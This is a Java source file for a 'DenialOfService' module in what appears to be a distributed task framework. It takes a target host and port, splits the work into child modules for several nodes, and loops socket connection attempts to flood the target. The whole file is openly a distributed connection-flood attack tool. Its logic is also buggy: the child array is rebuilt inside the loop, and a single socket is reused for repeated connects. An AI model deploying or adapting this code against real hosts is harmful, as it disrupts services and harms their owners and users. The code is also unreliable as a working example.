package problemModule;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;

public class DenialOfService implements ProblemModule {
	

	private static final long serialVersionUID = 1L;// unused serialization id variable
	private Integer id;								// problem module id; 0 = parent, 1 or higher = child
	private Integer numAttempts;					// number of connection attempts
	private String hostName;						// target's host name
	private Integer portNumber;						// target's port number
	private Socket connectionSpammer;				// socket used to send connection requests
	private InetSocketAddress target;				// InetSocketAddress constructed from hostName and portNumber
	
	/*
	 * Parent problem module constructor
	 * attempts = number of connection attempts
	 * host = target's host name
	 * port = target's port number
	 */
	public DenialOfService(Integer attempts, String host, Integer port) {
		id = 0;
		numAttempts = attempts;
		hostName = host;
		portNumber = port;
	}
	
	/*
	 * Child problem module constructor
	 * attempts = number of connection attempts
	 * host = target's host name
	 * port = target's port number
	 * childID = child problem module's id
	 */
	public DenialOfService(Integer attempts, String host, Integer port, Integer childID) {
		id = childID;
		numAttempts = attempts;
		hostName = host;
		portNumber = port;
	}

	/*
	 * Breakdown method for DenialOfService
	 * Creates problem modules with id numbers from 1 to nodes
	 * and stores them in an array to return
	 */
	@Override
	public ProblemModule[] breakDown(Integer nodes) {
		ProblemModule[] distributed = null;
		
		if(nodes > 0) {		// input validation to make sure number of nodes isn't negative or zero
			for(int i = 0; i < nodes; i++) {
				distributed = new ProblemModule[nodes];
				distributed[i] = new DenialOfService(numAttempts, hostName, portNumber, i + 1);
			}
		}
		
		return distributed;	// returns null if there is an error
	}

	/*
	 * Solve method for DenialOfService
	 * Repeats connection requests to the target to the number
	 * of attempts specified by numAttempts
	 */
	@Override
	public void Solve() {
		try {
			connectionSpammer = new Socket();	// creates unconnected socket
			target = new InetSocketAddress(hostName, portNumber);	// target server and port number
			
			for(int i = 0; i < numAttempts; i++) {	// repeatedly requests connections to server 
				connectionSpammer.connect(target);
			}
			
		} catch (UnknownHostException e) {
			System.out.println(e.getMessage());
		} catch (IOException e) {
			System.out.println(e.getMessage());
		}
	}

	/*
	 * Finalize method for DenialOfService
	 * Does nothing because there is nothing to combine or return
	 */
	@Override
	public void finalize(ProblemModule[] subproblems) {
		
	}
	
	/*
	 * Get method for id
	 */
	public Integer getID() {
		return id;
	}
	
	/*
	 * Set method for id
	 */
	public void setID(Integer newID) {
		id = newID;
	}

	/*
	 * Unused for DenialOfService
	 */
	@Override
	public Object TestSolver() {
		return null;
	}
	
	/*
	 * Unused for DenialOfService
	 */
	@Override
	public boolean TEQ(Object o) {
		return false;
	}

	/*
	 * Unused for DenialOfService
	 */
	@Override
	public void DelaySolve() throws InterruptedException {
	}
	
}